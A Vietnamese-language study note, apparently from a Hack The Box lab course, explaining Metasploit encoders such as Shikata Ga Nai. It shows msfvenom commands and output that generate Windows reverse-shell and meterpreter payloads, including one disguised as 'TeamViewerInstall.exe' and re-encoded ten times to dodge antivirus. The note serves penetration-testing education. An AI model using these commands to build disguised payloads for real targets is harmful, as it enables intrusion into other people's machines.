Encoder 


Trong suốt 15 năm tồn tại của Metasploit Framework, Encoders đã hỗ trợ việc làm cho các payload tương thích với nhiều kiến trúc vi xử lý khác nhau, đồng thời giúp tránh né các phần mềm diệt virus.
Encoders đóng vai trò thay đổi payload để có thể chạy được trên các hệ điều hành và kiến trúc khác nhau.
Các kiến trúc này bao gồm: x64, x86, sparc, ppc, mips.

Encoders cũng cần thiết để loại bỏ các opcode dạng hex vốn được biết đến như các bad characters trong payload. Không chỉ vậy, việc mã hóa payload ở các định dạng khác nhau còn có thể giúp tránh bị phát hiện bởi phần mềm diệt virus (AV) như đã đề cập ở trên. Tuy nhiên, việc sử dụng encoders chỉ nhằm mục đích né AV đã giảm dần theo thời gian, do các hãng IPS/IDS đã cải thiện khả năng xử lý chữ ký (signatures) trong mã độc và virus. Shikata Ga Nai (SGN) từng là một trong những phương thức mã hóa (encoding scheme) được sử dụng nhiều nhất trước đây, vì nó khiến payload rất khó bị phát hiện. Tuy nhiên, ngày nay các phương pháp phát hiện hiện đại đã bắt kịp, và những payload được mã hóa theo cơ chế này không còn “ẩn thân” một cách phổ quát nữa.Tên gọi 仕方がない (Shikata Ga Nai) trong tiếng Nhật có nghĩa là “Không thể tránh được / Không còn cách nào khác”. Ý nghĩa này hoàn toàn đúng nếu chúng ta nói về nó vài năm trước. Tuy nhiên, hiện nay đã có những phương pháp khác mà chúng ta có thể khám phá để né tránh hệ thống bảo vệ. Bài viết từ FireEye giải thích chi tiết tại sao và như thế nào mà Shikata Ga Nai từng thống trị so với các encoder khác.
  Shikata Ga Nai : https://cloud.google.com/blog/topics/threat-intelligence/shikata-ga-nai-encoder-still-going-strong/
SGN là một encoder đa hình thức (polymorphic XOR additive feedback encoder). Mỗi lần mã hóa shellcode sẽ tạo ra một kết quả khác nhau nhờ các kỹ thuật như:
  Thay thế động các lệnh (instruction substitution),
  Thay đổi thứ tự khối lệnh (dynamic block ordering),
  Luân chuyển ngẫu nhiên các thanh ghi (register),
  Thêm mã rác (junk code),
  Sử dụng khóa ngẫu nhiên (random key),
  Và thêm khoảng trống lệnh ngẫu nhiên...
  Điều này giúp tạo ra khả năng mã hóa tự giải mã (self-decoding) với vẻ ngoài rất ngẫu nhiên, gây khó khăn cho các công cụ phát hiện tĩnh  
Nhưng hiện tại không khả thi nữa r. Các AV, IDS IPS được cải tiến nhiều hơn 

Trước năm 2015, Metasploit Framework có các module con riêng để xử lý payloads và encoders. Chúng được đóng gói tách biệt khỏi script msfconsole và được gọi là msfpayload và msfencode. Hai công cụ này nằm trong thư mục:
  /usr/share/framework2/
Nếu chúng ta muốn tạo payload tùy chỉnh, ta có thể làm điều đó bằng msfpayload, nhưng sau đó cần phải mã hóa (encode) payload này theo đúng kiến trúc hệ điều hành mục tiêu bằng msfencode.
Một pipeline (dấu “|”) sẽ lấy đầu ra từ lệnh đầu tiên và chuyển cho lệnh tiếp theo, từ đó sinh ra một payload đã được mã hóa, sẵn sàng gửi đi và chạy trên máy mục tiêu

  naruto3co@htb[/htb]$ msfpayload windows/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 R | msfencode -b '\x00' -f perl -e x86/shikata_ga_nai
  [*] x86/shikata_ga_nai succeeded with size 1636 (iteration=1)
  my $buf = 
  "\xbe\x7b\xe6\xcd\x7c\xd9\xf6\xd9\x74\x24\xf4\x58\x2b\xc9" .
  "\x66\xb9\x92\x01\x31\x70\x17\x83\xc0\x04\x03\x70\x13\xe2" .
  "\x8e\xc9\xe7\x76\x50\x3c\xd8\xf1\xf9\x2e\x7c\x91\x8e\xdd" .
  "\x53\x1e\x18\x47\xc0\x8c\x87\xf5\x7d\x3b\x52\x88\x0e\xa6" .
  "\xc3\x18\x92\x58\xdb\xcd\x74\xaa\x2a\x3a\x55\xae\x35\x36" .
  "\xf0\x5d\xcf\x96\xd0\x81\xa7\xa2\x50\xb2\x0d\x64\xb6\x45" .
  "\x06\x0d\xe6\xc4\x8d\x85\x97\x65\x3d\x0a\x37\xe3\xc9\xfc" .
  "\xa4\x9c\x5c\x0b\x0b\x49\xbe\x5d\x0e\xdf\xfc\x2e\xc3\x9a" .
  "\x3d\xd7\x82\x48\x4e\x72\x69\xb1\xfc\x34\x3e\xe2\xa8\xf9" .
  "\xf1\x36\x67\x2c\xc2\x18\xb7\x1e\x13\x49\x97\x12\x03\xde" .
  "\x85\xfe\x9e\xd4\x1d\xcb\xd4\x38\x7d\x39\x35\x6b\x5d\x6f" .
  "\x50\x1d\xf8\xfd\xe9\x84\x41\x6d\x60\x29\x20\x12\x08\xe7" .
  "\xcf\xa0\x82\x6e\x6a\x3a\x5e\x44\x58\x9c\xf2\xc3\xd6\xb9" .
  <SNIP>

Từ sau năm 2015, hai công cụ riêng biệt:
  msfpayload (tạo payload)
  msfencode (mã hóa payload)
👉 đã được gộp lại thành một công cụ duy nhất là msfvenom.


Generating Payload - Without Encoding
  naruto3co@htb[/htb]$ msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -b "\x00" -f perl
  Found 11 compatible encoders
  Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
  x86/shikata_ga_nai succeeded with size 381 (iteration=0)
  x86/shikata_ga_nai chosen with final size 381
  Payload size: 381 bytes
  Final size of perl file: 1674 bytes
  my $buf = 
  "\xda\xc1\xba\x37\xc7\xcb\x5e\xd9\x74\x24\xf4\x5b\x2b\xc9" .
  "\xb1\x59\x83\xeb\xfc\x31\x53\x15\x03\x53\x15\xd5\x32\x37" .
  "\xb6\x96\xbd\xc8\x47\xc8\x8c\x1a\x23\x83\xbd\xaa\x27\xc1" .
  "\x4d\x42\xd2\x6e\x1f\x40\x2c\x8f\x2b\x1a\x66\x60\x9b\x91" .
  "\x50\x4f\x23\x89\xa1\xce\xdf\xd0\xf5\x30\xe1\x1a\x08\x31" .

Xem nó thay đổi như nào nếu áp dụng encoder shikata_ga_nai

Generating Payload - With Encoding
  naruto3co@htb[/htb]$ msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -b "\x00" -f perl -e x86/shikata_ga_nai
  Found 1 compatible encoders
  Attempting to encode payload with 3 iterations of x86/shikata_ga_nai
  x86/shikata_ga_nai succeeded with size 326 (iteration=0)
  x86/shikata_ga_nai succeeded with size 353 (iteration=1)
  x86/shikata_ga_nai succeeded with size 380 (iteration=2)
  x86/shikata_ga_nai chosen with final size 380
  Payload size: 380 bytes
  buf = ""
  buf += "\xbb\x78\xd0\x11\xe9\xda\xd8\xd9\x74\x24\xf4\x58\x31"
  buf += "\xc9\xb1\x59\x31\x58\x13\x83\xc0\x04\x03\x58\x77\x32"
  buf += "\xe4\x53\x15\x11\xea\xff\xc0\x91\x2c\x8b\xd6\xe9\x94"
  buf += "\x47\xdf\xa3\x79\x2b\x1c\xc7\x4c\x78\xb2\xcb\xfd\x6e"
  buf += "\xc2\x9d\x53\x59\xa6\x37\xc3\x57\x11\xc8\x77\x77\x9e"

Tham khảo "https://hatching.io/blog/metasploit-payloads2/"

Nếu muốn xem xét hoạt động của bộ mã hóa shikata_ga_nai, chúng ta có thể tham khảo một bài viết tuyệt vời tại đây.
Giả sử chúng ta muốn chọn một bộ mã hóa cho một payload hiện có. Sau đó, chúng ta có thể sử dụng lệnh show encoders trong msfconsole để xem những bộ mã hóa nào khả dụng cho tổ hợp mô-đun Exploit + Payload hiện tại của chúng ta.

  msf6 exploit(windows/smb/ms17_010_eternalblue) > set payload 15
  payload => windows/x64/meterpreter/reverse_tcp
  msf6 exploit(windows/smb/ms17_010_eternalblue) > show encoders
  Compatible Encoders
  ===================
     #  Name              Disclosure Date  Rank    Check  Description
     -  ----              ---------------  ----    -----  -----------
     0  generic/eicar                      manual  No     The EICAR Encoder
     1  generic/none                       manual  No     The "none" Encoder
     2  x64/xor                            manual  No     XOR Encoder
     3  x64/xor_dynamic                    manual  No     Dynamic key XOR Encoder
     4  x64/zutto_dekiru                   manual  No     Zutto Dekiru  

Lệnh show encoders nó chỉ lọc những encoder hợp lệ theo exploit 
Hãy xem xét ví dụ trên như một ví dụ giả định. Nếu chúng ta mã hóa một payload thực thi chỉ một lần bằng SGN, rất có thể nó sẽ bị hầu hết các phần mềm diệt virus hiện nay phát hiện. Hãy cùng tìm hiểu sâu hơn về điều này. Lấy msfvenom, chỉ số dưới của Framework xử lý việc tạo payload và các lược đồ mã hóa, chúng ta có dữ liệu đầu vào sau:

  naruto3co@htb[/htb]$ msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=8080 -e x86/shikata_ga_nai -f exe -o ./TeamViewerInstall.exe
  Found 1 compatible encoders
  Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
  x86/shikata_ga_nai succeeded with size 368 (iteration=0)
  x86/shikata_ga_nai chosen with final size 368
  Payload size: 368 bytes
  Final size of exe file: 73802 bytes
  Saved as: TeamViewerInstall.exe

check trên virusTotal đỏ lòm =)) 

Một lựa chọn tốt hơn là thử chạy nó qua nhiều lần lặp lại của cùng một lược đồ mã hóa:
  naruto3co@htb[/htb]$ msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=8080 -e x86/shikata_ga_nai -f exe -i 10 -o /root/Desktop/TeamViewerInstall.exe
  Found 1 compatible encoders
  Attempting to encode payload with 10 iterations of x86/shikata_ga_nai
  x86/shikata_ga_nai succeeded with size 368 (iteration=0)
  x86/shikata_ga_nai succeeded with size 395 (iteration=1)
  x86/shikata_ga_nai succeeded with size 422 (iteration=2)
  x86/shikata_ga_nai succeeded with size 449 (iteration=3)
  x86/shikata_ga_nai succeeded with size 476 (iteration=4)
  x86/shikata_ga_nai succeeded with size 503 (iteration=5)
  x86/shikata_ga_nai succeeded with size 530 (iteration=6)
  x86/shikata_ga_nai succeeded with size 557 (iteration=7)
  x86/shikata_ga_nai succeeded with size 584 (iteration=8)
  x86/shikata_ga_nai succeeded with size 611 (iteration=9)
  x86/shikata_ga_nai chosen with final size 611
  Payload size: 611 bytes
  Final size of exe file: 73802 bytes
  Error: Permission denied @ rb_sysopen - /root/Desktop/TeamViewerInstall.exe

-> lệnh tên có -i 10 là lặp lại mã hoá 10 lần để tăng khả năng bypass AV 
Nhưng vẫn đỏ lòm 

Có thể check trực tiếp qua câu lệnh với điều kiện là cần API key free trên virus total 
  naruto3co@htb[/htb]$ msf-virustotal -k <API key> -f TeamViewerInstall.exe




